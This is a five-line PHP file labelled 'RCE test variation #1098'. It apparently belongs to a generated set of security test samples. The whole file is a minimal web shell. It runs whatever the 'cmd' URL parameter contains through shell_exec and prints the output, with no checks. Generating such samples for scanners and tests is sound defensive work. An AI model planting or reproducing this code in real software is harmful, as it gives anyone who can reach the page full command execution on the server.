<?php
// RCE test variation #1098
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>